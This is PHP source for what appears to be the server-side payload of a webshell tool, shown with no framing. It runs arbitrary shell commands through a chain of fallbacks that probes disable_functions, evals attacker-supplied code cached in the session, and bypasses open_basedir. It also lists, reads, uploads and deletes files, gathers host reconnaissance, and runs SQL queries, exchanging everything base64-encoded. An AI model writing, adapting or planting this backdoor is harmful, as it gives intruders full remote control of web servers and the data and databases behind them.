$parameters=array();

function run($pms){
    formatParameter($pms.'&ILikeYou='.base64Encode('metoo'));

    if ($_SESSION["bypass_open_basedir"]==true){
        @bypass_open_basedir();
    }

    return base64Encode(evalFunc());
}

function bypass_open_basedir(){
    if(!@file_exists('bypass_open_basedir')){
        @mkdir('bypass_open_basedir');
    }
    @chdir('bypass_open_basedir');
    @ini_set('open_basedir','..');
    @$_Ei34Ww_sQDfq_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    @$_Ei34Ww_sQDfq_path = str_replace("\\",'/',$_Ei34Ww_sQDfq_FILENAME);
    @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/') + 1;
    $_Ei34Ww_sQDfq_i = 0;
    while($_Ei34Ww_sQDfq_i < $_Ei34Ww_sQDfq_num){
        @chdir('..');
        $_Ei34Ww_sQDfq_i++;
    }
    @ini_set('open_basedir','/');
    @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
}

function formatParameter($pms){
    global $parameters;
    $pms=explode("&",$pms);
    foreach ($pms as $kv){
        $kv=explode("=",$kv);
        if (sizeof($kv)>=2){
            $parameters[$kv[0]]=base64Decode($kv[1]);

        }

    }

}
function evalFunc(){
    @session_write_close();
    $className=get("codeName");
    $methodName=get("methodName");
    if ($methodName!=null){
        if (strlen(trim($className))>0){
            if ($methodName=="includeCode"){
                return includeCode();
            }else{
                if (isset($_SESSION[$className])){
                    return eval($_SESSION[$className]);
                }else{
                    return "{$className} no load";
                }
            }
        }else{
            return $methodName();
        }
    }else{
        return "methodName Is Null";
    }

}
function deleteDir($p){
    $m=@dir($p);
    while(@$f=$m->read()){
        $pf=$p."/".$f;
        @chmod($pf,0777);
        if((is_dir($pf))&&($f!=".")&&($f!="..")){
            deleteDir($pf);
            @rmdir($pf);
        }else if (is_file($pf)&&($f!=".")&&($f!="..")){
            @unlink($pf);
        }
    }
    $m->close();
    @chmod($p,0777);
    return @rmdir($p);
}
function deleteFile(){
    $F=get("fileName");
    if(is_dir($F)){
        return deleteDir($F)?"ok":"fail";
    }else{
        return (file_exists($F)?@unlink($F)?"ok":"fail":"fail");
    }
}
function copyFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (@is_file($srcFileName)){
        if (copy($srcFileName,$destFileName)){
            return "ok";
        }else{
            return "fail";
        }
    }else{
        return "The target does not exist or is not a file";
    }
}
function moveFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (rename($srcFileName,$destFileName)){
        return "ok";
    }else{
        return "fail";
    }

}
function getBasicsInfo()
{
    $data = array();
    $data['OsInfo'] = @php_uname();
    $data['CurrentUser'] = @get_current_user();
    $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) > 0 ? $data['CurrentUser'] : 'NULL';
    $data['disable_functions'] = (@ini_get('disable_functions'));
    $data['disable_functions'] = strlen(trim($data['disable_functions'])) > 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions');
    $data['timezone'] = @ini_get('date.timezone');
    $data['encode'] = @ini_get('exif.encode_unicode');
    $data['extension_dir'] = @ini_get('extension_dir');
    $data['include_path'] = @ini_get('include_path');
    $data['PHP_SAPI'] = PHP_SAPI;
    $data['PHP_VERSION'] = PHP_VERSION;
    $data['memory_limit'] = ini_get('memory_limit');
    $data['upload_max_filesize'] = ini_get('upload_max_filesize');
    $data['post_max_size'] = ini_get('post_max_size');
    $data['max_execution_time'] = ini_get('max_execution_time');
    $data['max_input_time'] = ini_get('max_input_time');
    $data['default_socket_timeout'] = ini_get('default_socket_timeout');
    $data['mygid'] = @getmygid();
    $data['mypid'] = @getmypid();
    $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['loaded_extensions'] = @implode(',', @get_loaded_extensions());
    $data['short_open_tag'] = @get_cfg_var('short_open_tag');
    $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false';
    $data['asp_tags'] = @get_cfg_var('asp_tags');
    $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false';
    $data['safe_mode'] = @get_cfg_var('safe_mode');
    $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false';
    $data['CurrentDir'] = str_replace('\\', '/', @dirname($_SERVER['SCRIPT_FILENAME']));
    $data['FileRoot'] = '';
    if (substr(__FILE__, 0, 1) != '/') {foreach (range('A', 'Z') as $L){ if (@is_dir("{$L}:")){ $data['FileRoot'] .= "{$L}:/;";}};};
    $data['FileRoot'] = (strlen(trim($data['FileRoot'])) > 0 ? $data['FileRoot'] : '/');
    $data['FileRoot']= substr_count($data['FileRoot'],substr(__FILE__, 0, 1))<=0?substr(__FILE__, 0, 1).":/":$data['FileRoot'];
    $result="";
    foreach($data as $key=>$value){
        $result.=$key." : ".$value."\n";
    }
    return $result;
}
function getFile(){
    $dir=get('dirName');
    $dir=(strlen(@trim($dir))>0)?trim($dir):str_replace('\\','/',dirname(__FILE__));
    $dir.="/";
    $path=$dir;
    $allFiles = @scandir($path);
    $data="";
    if ($allFiles!=null){
        $data.="ok";
        $data.="\n";
        $data.=$path;
        $data.="\n";
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                $fullPath = $path.$fileName;
                $lineData=array();
                array_push($lineData,$fileName);
                array_push($lineData,@is_file($fullPath)?"1":"0");
                array_push($lineData,date("Y-m-d H:i:s", @filemtime($fullPath)));
                array_push($lineData,@filesize($fullPath));
                $fr=(@is_readable($fullPath)?"R":"").(@is_writable($fullPath)?"W":"").(@is_executable($fullPath)?"X":"");
                array_push($lineData,(strlen($fr)>0?$fr:"F"));
                $data.=(implode("\t",$lineData)."\n");
            }

        }
    }else{
        return "Path Not Found Or No Permission!";
    }
    return $data;
}
function readFileContent(){
    $fileName=get("fileName");
    if (@is_file($fileName)){
        if (@is_readable($fileName)){
            return file_get_contents($fileName);
        }else{
            return "No Permission!";
        }
    }else{
        return "File Not Found";
    }
}
function uploadFile(){
    $fileName=get("fileName");
    $fileValue=get("fileValue");
    if (@file_put_contents($fileName,$fileValue)!==false){
        return "ok";
    }else{
        return "fail";
    }
}
function newDir(){
    $dir=get("dirName");
    if (@mkdir($dir,0777,true)!==false){
        return "ok";
    }else{
        return "fail";
    }
}
function newFile(){
    $fileName=get("fileName");
    if (@file_put_contents($fileName,"")!==false){
        return "ok";
    }else{
        return "fail";
    }
}
function execCommand(){
    $result = "";
    $command = get("cmdLine");
    $PadtJn = @ini_get('disable_functions');
    if (! empty($PadtJn)) {
        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
        $PadtJn = explode(',', $PadtJn);
        $PadtJn = array_map('trim', $PadtJn);
    } else {
        $PadtJn = array();
    }
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        $command = $command . " 2>&1\n";
    }
    if (is_callable('system') and ! in_array('system', $PadtJn)) {
        ob_start();
        system($command);
        $result = ob_get_contents();
        ob_end_clean();
    } else if (is_callable('proc_open') and ! in_array('proc_open', $PadtJn)) {
        $handle = proc_open($command, array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $result = NULL;
        while (! feof($pipes[1])) {
            $result .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } else if (is_callable('passthru') and ! in_array('passthru', $PadtJn)) {
        ob_start();
        passthru($command);
        $result = ob_get_contents();
        ob_end_clean();
    } else if (is_callable('shell_exec') and ! in_array('shell_exec', $PadtJn)) {
        $result = shell_exec($command);
    } else if (is_callable('exec') and ! in_array('exec', $PadtJn)) {
        $result = array();
        exec($command, $result);
        $result = join(chr(10), $result) . chr(10);
    } else if (is_callable('exec') and ! in_array('popen', $PadtJn)) {
        $fp = popen($command, 'r');
        $result = NULL;
        if (is_resource($fp)) {
            while (! feof($fp)) {
                $result .= fread($fp, 1024);
            }
        }
        @pclose($fp);
    } else {
        return "none of proc_open/passthru/shell_exec/exec/exec is available";
    }
    return $result;
}
function execSql(){
    $dbType=get("dbType");
    $dbHost=get("dbHost");
    $dbPort=get("dbPort");
    $username=get("dbUsername");
    $password=get("dbPassword");
    $execType=get("execType");
    $execSql=get("execSql");
    function  mysql_exec($host,$port,$username,$password,$execType,$sql){
        // 创建连接
        $conn = new mysqli($host,$username,$password,"",$port);
        // Check connection
        if ($conn->connect_error) {
            return $conn->connect_error;
        }

        $result = $conn->query($sql);
        if ($conn->error){
            return $conn->error;
        }
        $result = $conn->query($sql);
        if ($execType=="update"){
            return "Query OK, "+$conn->affected_rows+" rows affected";
        }else{
            $data="ok\n";
            while ($column = $result->fetch_field()){
                $data.=base64_encode($column->name)."\t";
            }
            $data.="\n";
            if ($result->num_rows > 0) {
                // 输出数据
                while($row = $result->fetch_assoc()) {
                    foreach ($row as $value){
                        $data.=base64_encode($value)."\t";
                    }
                    $data.="\n";
                }
            }
            return $data;
        }
    }
    function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql){
        try {
            $conn = new PDO("{$databaseType}:host=$host;port={$port};", $username, $password);

            // 设置 PDO 错误模式为异常
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            if ($execType=="update"){
                return "Query OK, "+$conn->exec($sql)+" rows affected";
            }else{
                $data="ok\n";
                $stm=$conn->prepare($sql);
                $stm->execute();
                $row=$stm->fetch(PDO::FETCH_ASSOC);
                $_row="\n";
                foreach (array_keys($row) as $key){
                    $data.=base64_encode($key)."\t";
                    $_row.=base64_encode($row[$key])."\t";
                }
                $data.=$_row."\n";
                while ($row=$stm->fetch(PDO::FETCH_ASSOC)){
                    foreach (array_keys($row) as $key){
                        $data.=base64_encode($row[$key])."\t";
                    }
                    $data.="\n";
                }
                return $data;
            }

        }
        catch(PDOException $e)
        {
            return $e->getMessage();
        }
    }
    if ($dbType=="mysql"){
        if (extension_loaded("mysqli")){
            return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else if (extension_loaded("pdo")){
            return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
        }else{
            return "no extension";
        }
    }else if (extension_loaded("pdo")){
        return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);
    }else{
        return "no extension";
    }
    return "no extension";

}
function base64Encode($data){
    return base64_encode($data);
}
function test(){
    return "ok";
}
function get($key){
    global $parameters;
    if (isset($parameters[$key])){
        return $parameters[$key];
    }else{
        return null;
    }
}
function includeCode(){
    @session_start();
    $classCode=get("binCode");
    $codeName=get("codeName");
    $_SESSION[$codeName]=$classCode;
    @session_write_close();
    return "ok";
}
function base64Decode($string){
    return base64_decode($string);
}